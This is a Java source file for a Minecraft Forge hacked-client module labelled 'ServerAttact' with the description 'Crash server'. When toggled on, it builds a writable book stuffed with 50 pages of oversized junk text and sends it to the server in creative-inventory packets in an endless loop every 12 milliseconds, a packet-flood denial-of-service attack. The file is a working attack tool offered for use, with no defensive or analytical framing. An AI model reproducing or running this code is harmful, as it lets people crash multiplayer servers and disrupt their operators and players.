package net.wurstclient.forge.hacks;

import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraftforge.common.MinecraftForge;
import net.wurstclient.forge.Category;
import net.wurstclient.forge.Hack;
import net.wurstclient.forge.utils.ChatUtils;
import net.wurstclient.forge.utils.Wrapper;

public class ServerHack extends Hack{
	public ServerHack() {
		super("ServerAttact","Crash server");
		setCategory(Category.OTHER);
	}

	@Override
	protected void onEnable() {
		new Thread() {
            @Override
            public void run() {
                try {
                    ChatUtils.warning("Attack...");
                    final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList list = new NBTTagList();
                    final NBTTagCompound tag = new NBTTagCompound();
                    final String author = Wrapper.getMinecraft().getSession().getUsername();
                    final String title = "Title";
                    final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i) {
                        final String siteContent = size;
                        final NBTTagString tString = new NBTTagString(siteContent);
                        list.appendTag(tString);
                    }
                    
                    tag.setString("author", author);
                    tag.setString("title", title);
                    tag.setTag("pages", list);
                    bookObj.setTagInfo("pages", list);
                    bookObj.setTagCompound(tag);
                    
                    while (true) {
                    	Wrapper.getMinecraft().getConnection().sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                        Thread.sleep(12L);
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
		MinecraftForge.EVENT_BUS.register(this);
	}
	
}
